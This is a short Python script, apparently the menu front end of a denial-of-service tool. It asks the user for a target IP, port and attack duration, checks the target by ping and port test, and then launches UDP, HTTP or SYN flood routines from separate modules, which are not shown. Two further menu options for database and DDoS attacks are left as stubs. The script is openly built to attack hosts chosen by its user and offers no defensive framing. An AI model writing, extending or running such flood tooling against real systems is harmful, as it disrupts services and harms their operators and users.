from time import sleep
import syn_flood
import udp_flood
import tool
import http_flood

tool.surface()
choose = input("Please input your choose:")  # todo 校验输入
# print(choose)
if choose == "1":
    print("Now you in udpflood method")
    ip = input("Please input the ip you wanna attack：")  # todo 校验ip
    port = input("Please input the port you wanna attack：")
    user_time = input("Please input the time you wanna attack：")
    ip_right = tool.check_ip(ip)
    tool.ping(ip_right)
    tool.test_port(ip_right, port)
    udp_flood.udpfloods(ip_right, port, user_time)  # todo string转
elif choose == "2":
    http_flood.start()
elif choose == "3":
    syn_flood.start()
elif choose == "4":
    # todo DBattack
    input()
elif choose == "5":
    # todo ddos
    input()
else:
    quit()
